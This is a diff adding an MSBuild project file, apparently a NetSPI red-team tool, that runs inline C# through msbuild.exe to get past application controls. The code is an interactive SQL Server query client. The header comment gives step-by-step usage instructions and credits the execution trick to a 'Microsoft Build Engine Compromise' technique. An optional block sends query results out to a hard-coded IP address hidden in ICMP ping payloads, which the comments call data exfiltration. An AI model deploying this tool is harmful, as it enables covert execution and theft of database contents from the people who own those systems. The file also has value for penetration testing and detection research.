@@ -1,0 +1,263 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	<!--
+		Author: Scott Sutherland (@_nullbind), NetSPI 2019
+		Version: 0.1 (work in progress)
+		Description: This is a simple C# SQL Server client that can be run through msbuild. 
+		By setting the "enableicmp" to true, and setting and IP the results of each query
+		can be included in the payload of the ICMP request for the purpose of data exfiltration.
+	    Instructions: 
+		1. 	Save this to a .xml or .csproj file.
+		2. 	In a console, navigate to the folder containing this .csproj or .xml file.
+		3. 	Run the msbuild.exe command from its path using one of the commands below. 
+			You can explicitly define the .csproj file to load, but it is not required 
+			if only one .csproj file existing the your current working directory. 
+			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 
+			C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj
+			
+		Note: This execution technique is entirely based on Casey Smith magic.
+		http://subt0x11.blogspot.com/2018/11/microsoft-build-engine-compromise-part_13.html
+	-->
+	<Target Name="SQLClient">
+		<SQLClientExample />
+	</Target>
+	<UsingTask
+    TaskName="SQLClientExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>	
+		<Reference Include="C:\Windows\Microsoft.NET\Framework\v2.0.50727\System.Data.dll" />
+		<Reference Include="C:\Windows\Microsoft.NET\Framework\v2.0.50727\System.Xml.dll" />
+	
+		<Code Type="Class" Language="cs">
+		<![CDATA[				
+		using System;
+		using System.IO;
+		using Microsoft.Build.Framework;
+		using Microsoft.Build.Utilities;			
+		using System.Text;			
+		using System.Data;
+		using System.Data.SqlClient;
+		using System.Data.SqlTypes;
+		using System.Net.NetworkInformation;
+		
+		// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Net.NetworkInformation.dll		
+		
+		public class SQLClientExample :  Task, ITask
+		{
+			public override bool Execute()
+			{
+				SQLCommands.RunQuery("","");				
+				return true;
+				}
+		}
+
+		public class SQLCommands
+		{
+			public static string RunQuery(string MyConnString, string filePath)
+			{											
+				// Read line from the client
+				Console.WriteLine("----------");
+				Console.Write("SQLCLIENT> ");
+				String MyQuery = Console.ReadLine().ToString();
+
+				// Collect multi-line command until "go" is given
+				string fullcommand  = "";
+				string connString = MyConnString;
+				while (MyQuery.ToLower() != "go")
+				{
+					fullcommand  = fullcommand + "\n" + MyQuery;
+
+					// Exit if requested
+					if(MyQuery.ToLower().Equals("exit") || MyQuery.ToLower().Equals("quit") || MyQuery.ToLower().Equals("bye"))
+					{ 
+					return "placeholder";
+					}
+
+					// Allow ability to set custom connection string
+					bool loadCheck = MyQuery.ToLower().Contains("setconn");							
+					if(loadCheck)
+					{
+						Console.Write("\nSetting connection string to:");
+						string newcon = MyQuery.Replace("setconn ","");
+						Console.Write("\n" + newcon + "\n");
+						connString = newcon;
+						fullcommand = "";
+						Console.Write("\nSQLCLIENT> ");								
+					}
+
+					// Allow ability to set custom output file
+					bool fileCheck = MyQuery.ToLower().Contains("setfile");							
+					if(fileCheck)
+					{
+						Console.Write("\nSetting output path to:");
+						string newfile = MyQuery.Replace("setfile ","");
+						Console.Write("\n" + newfile + "\n");
+						filePath = newfile;
+						fullcommand = "";
+						Console.WriteLine("----------");
+						Console.Write("\nSQLCLIENT> ");								
+					}						
+						
+					// Clear console if requested
+					if(MyQuery.ToLower().Equals("clear"))
+					{ 
+						Console.Clear();
+						fullcommand = "";
+						Console.WriteLine("----------");
+						Console.Write("SQLCLIENT> ");
+					}
+						
+					// Provide help
+					bool helpCheck = MyQuery.ToLower().Contains("help");
+					if(MyQuery.ToLower().Equals("help")){ 							
+						Console.WriteLine("\n");
+						Console.WriteLine(" BELOW IS A LIST OF SUPPORTED COMMANDS");	
+						Console.WriteLine("\n");							
+						Console.WriteLine(" COMMAND    		TSQL queries");
+						Console.WriteLine(" DESCRIPTION		Type the query, then \"go\":");
+						Console.WriteLine(" EXAMPLE    		SELECT @@VERSION");
+						Console.WriteLine("            		GO");
+						Console.WriteLine("\n");
+						Console.WriteLine(" COMMAND    		setcon"); 
+						Console.WriteLine(" DESCRIPTION		By default the connection string is harded coded.  Use this command to change it on the fly.");
+						Console.WriteLine(" EXAMPLE 1  		setcon Server=SERVER1\\Instance;Database=Master;User ID=Username;Password=Password;"); 
+						Console.WriteLine(" EXAMPLE 2  		setcon Server=SERVER1\\Instance;Database=Master;Integrated Security=SSPI;"); 
+						Console.WriteLine(" EXAMPLE 3  		setcon Server=SERVER1\\Instance;Database=Master;Integrated Security=SSPI;uid=domain\\user;pwd=password123"); 
+						Console.WriteLine("\n");
+						Console.WriteLine(" COMMAND    		setfile"); 
+						Console.WriteLine(" DESCRIPTION		By default, the output file is c:\\windows\\temp\\output.csv. Use this command to change it on the fly."); 
+						Console.WriteLine(" EXAMPLE    		setfile c:\\windows\\temp\\file.csv"); 
+						Console.WriteLine("\n");
+						fullcommand = "";
+						Console.Write("SQLCLIENT> ");
+					}						
+							
+					// Show multi-line input						
+					if((MyQuery.ToLower() != "clear") && (!loadCheck) && (!fileCheck) && (!helpCheck))
+					{ 
+						Console.Write("         > ");
+					}						
+
+					// Collect additional query lines						
+					MyQuery = Console.ReadLine().ToString();
+				}					
+
+				// Create data table to store results
+				DataTable dt = new DataTable(); 				
+				
+				// Run query				
+				try{												
+					// Set connection string						
+					if(connString.Equals(""))
+					{
+						connString = @"Server=SQLServer\INSTANCE;Database=Master;Integrated Security=SSPI;";						
+					}
+
+					// Create new connection
+					SqlConnection conn = new SqlConnection(connString);        
+					SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
+					conn.Open();
+
+					// Execute query and read data into data table
+					SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
+					da.Fill(dt);
+
+					// Display output of data table
+					DataRow[] currentRows = dt.Select(null, null, DataViewRowState.CurrentRows);
+
+					// Display results to screen
+					if (currentRows.Length < 1 )
+					{
+						Console.WriteLine("\nNo rows returned.");
+					}else{
+						Console.WriteLine("\n QUERY RESULTS:\n");
+
+						foreach (DataColumn column in dt.Columns)
+						{																		
+							Console.Write("\t{0}", column.ColumnName);
+						}
+
+						Console.WriteLine("\t");
+
+						foreach (DataRow row in currentRows)
+						{
+							foreach (DataColumn column in dt.Columns)
+							{
+								Console.Write("\t{0}", row[column]);
+							}
+							
+							Console.WriteLine("\t");
+						}							
+
+						// Write results to csv
+						StringBuilder fileContent = new StringBuilder();
+						if(filePath.Equals("")){
+							filePath = "c:\\Windows\\Temp\\output.csv";
+						}								
+
+						foreach (var col in dt.Columns) 
+						{
+							fileContent.Append(col.ToString() + ",");
+						}
+
+						fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
+						foreach (DataRow dr in dt.Rows) 
+						{
+							foreach (var column in dr.ItemArray) 
+							{
+								fileContent.Append("\"" + column.ToString() + "\",");
+							}
+						
+							fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
+						}
+
+						try{
+							System.IO.File.WriteAllText(filePath, fileContent.ToString());
+							Console.WriteLine("\nSuccessfully wrote query output to " + filePath);
+
+								// send results in icmp
+                // https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
+								string enableicmp = "";
+								if(enableicmp == "true")
+								{									
+									string ipaddress = "192.168.1.1";
+									Ping pingSender = new Ping ();
+									PingOptions options = new PingOptions ();
+
+									// Use the default Ttl value which is 128,
+									// but change the fragmentation behavior.
+									options.DontFragment = true;
+
+									// Create a buffer of 32 bytes of data to be transmitted.
+									string data = fileContent.ToString();
+									byte[] buffer = Encoding.ASCII.GetBytes (data);
+									int timeout = 120;
+									PingReply reply = pingSender.Send (ipaddress, timeout, buffer, options);
+									if (reply.Status == IPStatus.Success)
+									{
+										//Console.WriteLine ("Address: {0}", reply.Address.ToString ());
+										//Console.WriteLine ("RoundTrip time: {0}", reply.RoundtripTime);
+										//Console.WriteLine ("Time to live: {0}", reply.Options.Ttl);
+										//Console.WriteLine ("Don't fragment: {0}", reply.Options.DontFragment);
+										//Console.WriteLine ("Buffer size: {0}", reply.Buffer.Length);
+									}	
+								}								
+						}catch{
+							Console.WriteLine("\nFailed to write query output to " + filePath);									
+						}							
+					}							
+				}						
+				catch(SqlException ex)
+				{
+					Console.WriteLine(ex.Errors[0].Message);
+				}
+
+				RunQuery(connString,filePath);				
+				return "placeholder";
+			}
+		}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
